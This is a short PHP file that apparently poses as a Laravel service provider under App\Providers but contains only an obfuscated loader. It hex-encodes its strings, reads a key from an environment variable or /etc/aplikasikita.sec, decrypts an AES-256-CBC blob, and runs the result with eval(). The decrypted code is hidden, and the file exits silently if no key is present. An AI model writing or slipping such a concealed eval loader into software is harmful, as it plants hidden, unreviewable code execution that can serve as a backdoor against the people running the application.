<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('QnsomP8TEr4PvW8bVVC0gA==');
$c=base64_decode(
'szUtedV99+ROF2jFOrDBrW7bUOc4nG+s9IrDp3pm+cigZiDyD5MWl/fyCm1oHfsHdeFZOhd/K08E' .
'twdQEUbK2UBJNdoFsmQmSj3PPVDZDoK04ENlWhvCcDYEtKG0JvE73vLR82bgt0aAyxji2Qh4xyvG' .
'GtK9MVlL2cVIUVnIN03M6zyuRBK0GN1QuFUEDI+O/AAjud8J6qx6BKtLrRiaZS+5Te0wBIohfUdh' .
'0wcDPMcMCRIWYNQ0gpBCFtg1HnIPJXPjgFLYv/mIcKaGo7VsoCEx2COHjrek17Bi/G9Ys7eL+mRF' .
'g7APhJnoxJmNqb1IhrDHrjpElEXSvE6yZGjk9iMYhRzbu93IL/+mQET8wd9nxQTDmJnoyXml1V5I' .
'ysYClQF+KmQLVfT4bItQbC/LBZUw7YonSScJXDnXs98zditPQ9Lyb+hHm1mKbLH4er2OvHJbmtJc' .
'R2WUMOeZtVLIaKqkD2rqeNdq3MB12MXLpxHMSVP8GsObM0cZjT3EdGFyhDjoeAwvqAGQibnNtGCG' .
'xvA7wKNm4hD/UZAgrPmuUqsISTUQYwOsVoi+n8n0Fiw0k3RLwkab2oIfiq2qxon+uKqLEj1yCD2H' .
'It4QG1lNAH+l0fQC3rXpxXUbJqn9Go64wFx1/+XlxU7lcPbvxyuVhh2tlKHBtWpFBNqNXijogJxU' .
'F5e7p5XoYalEU2oCDcJw9bm8BDkYY0DDcg1wF8AAnSUT9r9KenVntbsxwqQV8So6ymXQDKUMg9We' .
'uJUIRrO+cyBXETuQFxA3vRj36FTnzy/HLDEPADlbojPSisG8LwrwUpx2Ee7FGuqN0qWFz69Ul7hn' .
'5lN1AM2d/Hec6Ycyhf6nNGdMophYcb+JjNUuWdCFOFwktqkzfNWMeLwxm10nf5uZ+IPrPJHbXx3f' .
'LpXo4pRyFPCWxSCQ9ghf3+2QLLjlwsEqoxa40vkSKD9rdCT0'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
